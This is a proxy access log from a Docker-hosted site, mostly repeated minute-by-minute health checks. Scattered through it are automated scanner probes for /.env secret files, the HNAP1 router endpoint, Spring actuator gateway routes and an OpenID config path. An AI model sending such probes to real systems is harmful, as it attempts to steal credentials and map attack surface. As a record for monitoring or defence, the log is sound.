159.203.109.206 - - [20/Dec/2023:00:57:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11772 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:00:57:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11773 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:00:58:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11774 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:00:58:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11775 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:00:59:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11776 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:00:59:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11777 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:00:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11778 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:00:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11779 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11780 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:01:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11781 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11782 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:02:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11783 "www@docker" "http://172.18.0.9:80" 0ms
45.79.163.53 - - [20/Dec/2023:01:03:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11784 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:03:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11785 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:03:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11786 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.4 - - [20/Dec/2023:01:03:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11787 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:04:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11788 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:04:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11789 "www@docker" "http://172.18.0.9:80" 0ms
45.79.181.104 - - [20/Dec/2023:01:05:18 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11790 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:05:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11791 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:05:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11792 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:06:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11793 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:06:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11794 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:07:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11795 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:07:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11796 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:08:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11797 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:08:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11798 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:09:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11799 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:09:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11800 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:01:09:45 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11801 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:10:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11802 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:10:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11803 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:11:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11804 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:11:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11805 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:12:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11806 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:12:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11807 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:13:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11808 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:13:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11809 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:14:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11810 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:14:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11811 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:15:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11812 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:15:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11813 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:16:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11814 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:16:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11815 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:17:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11816 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:17:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11817 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:18:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11818 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:18:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11819 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:19:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11820 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:19:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11821 "www@docker" "http://172.18.0.9:80" 1ms
185.73.124.42 - - [20/Dec/2023:01:20:06 +0000] "GET /oauth/idp/.well-known/openid-configuration HTTP/1.1" 404 19 "-" "-" 11822 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:20:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11823 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:20:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11824 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:21:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11825 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:21:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11826 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:22:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11827 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:22:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11828 "www@docker" "http://172.18.0.9:80" 0ms
213.152.161.35 - - [20/Dec/2023:01:22:50 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11829 "web-to-websecure@internal" "-" 0ms
213.152.161.35 - - [20/Dec/2023:01:22:51 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11830 "-" "-" 0ms
213.152.161.35 - - [20/Dec/2023:01:22:51 +0000] "GET /HNAP1/ HTTP/1.1" 404 19 "-" "-" 11831 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:23:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11832 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:23:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11833 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:24:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11834 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:24:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11835 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:25:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11836 "www@docker" "http://172.18.0.9:80" 0ms
88.204.59.2 - - [20/Dec/2023:01:25:20 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11837 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:01:25:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11838 "www@docker" "http://172.18.0.9:80" 1ms
95.111.225.53 - - [20/Dec/2023:01:25:49 +0000] "GET / HTTP/1.0" 301 17 "-" "-" 11839 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:26:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11840 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:26:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11841 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:27:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11842 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:27:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11843 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:28:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11844 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:28:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11845 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:01:29:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11846 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:29:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11847 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:29:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11848 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:30:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11849 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:30:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11850 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:31:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11851 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:31:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11852 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:32:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11853 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:32:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11854 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:33:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11855 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:33:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11856 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:34:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11857 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:34:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11858 "www@docker" "http://172.18.0.9:80" 1ms
35.190.199.12 - - [20/Dec/2023:01:34:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11859 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:35:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11860 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:35:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11861 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:36:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11862 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:36:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11863 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:37:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11864 "www@docker" "http://172.18.0.9:80" 0ms
172.203.248.158 - - [20/Dec/2023:01:37:33 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 11865 "web-to-websecure@internal" "-" 0ms
172.203.248.158 - - [20/Dec/2023:01:37:33 +0000] "GET /?%3Cplay%3Ewithme%3C/%3E HTTP/1.1" 301 17 "-" "-" 11866 "web-to-websecure@internal" "-" 0ms
172.203.248.158 - - [20/Dec/2023:01:37:33 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 11867 "web-to-websecure@internal" "-" 0ms
172.203.248.158 - - [20/Dec/2023:01:37:33 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 11868 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [20/Dec/2023:01:37:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11869 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:38:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11870 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:38:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11871 "www@docker" "http://172.18.0.9:80" 0ms
57.129.23.166 - - [20/Dec/2023:01:38:48 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 11872 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:01:38:48 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 11873 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:39:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11874 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:39:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11875 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:40:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11876 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:40:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11877 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:41:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11878 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:41:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11879 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:42:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11880 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:42:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11881 "www@docker" "http://172.18.0.9:80" 1ms
83.97.73.87 - - [20/Dec/2023:01:42:56 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 11882 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:43:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11883 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:43:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11884 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:44:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11885 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:44:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11886 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:45:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11887 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:45:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11888 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:46:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11889 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:46:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11890 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:47:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11891 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:47:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11892 "www@docker" "http://172.18.0.9:80" 1ms
54.36.115.221 - - [20/Dec/2023:01:47:54 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 11893 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [20/Dec/2023:01:47:54 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 11894 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:48:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11895 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:48:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11896 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:49:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11897 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:49:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11898 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:50:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11899 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:50:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11900 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:51:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11901 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:51:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11902 "www@docker" "http://172.18.0.9:80" 3ms
159.203.109.206 - - [20/Dec/2023:01:52:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11903 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:52:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11904 "www@docker" "http://172.18.0.9:80" 1ms
198.244.213.98 - - [20/Dec/2023:01:52:49 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 11905 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:01:53:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11906 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:53:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11907 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:54:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11908 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:54:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11909 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:55:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11910 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:01:55:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11911 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:01:56:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11912 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:56:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11913 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:57:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11914 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:57:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11915 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:58:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11916 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11917 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:01:59:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11918 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:01:59:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11919 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:02:00:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11920 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:00:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11921 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:02:01:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11922 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:01:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11923 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:02:02:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11924 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:02:02:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11925 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:03:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11926 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:03:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11927 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:02:04:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11928 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:04:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11929 "www@docker" "http://172.18.0.9:80" 0ms
83.97.73.87 - - [20/Dec/2023:02:04:57 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 19 "-" "-" 11930 "-" "-" 0ms
159.203.109.206 - - [20/Dec/2023:02:05:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11931 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:05:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11932 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:06:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11933 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:06:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11934 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:02:07:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11935 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:07:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11936 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:08:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11937 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:08:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11938 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [20/Dec/2023:02:09:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11939 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:09:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11940 "www@docker" "http://172.18.0.9:80" 0ms
57.129.23.166 - - [20/Dec/2023:02:09:37 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 11941 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [20/Dec/2023:02:09:37 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 11942 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:02:10:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11943 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:10:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11944 "www@docker" "http://172.18.0.9:80" 1ms
84.54.51.29 - - [20/Dec/2023:02:10:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11945 "web-to-websecure@internal" "-" 0ms
84.54.51.29 - - [20/Dec/2023:02:10:40 +0000] "POST /HNAP1/ HTTP/1.1" 308 18 "-" "-" 11946 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:02:11:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11947 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:02:11:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11948 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:12:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11949 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:12:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11950 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [20/Dec/2023:02:13:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 11951 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [20/Dec/2023:02:13:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11952 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [20/Dec/2023:02:13:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11953 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [20/Dec/2023:02:14:20 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11954 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [20/Dec/2023:02:14:34 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 11955 "www@docker" "http://172.18.0.9:80" 1ms
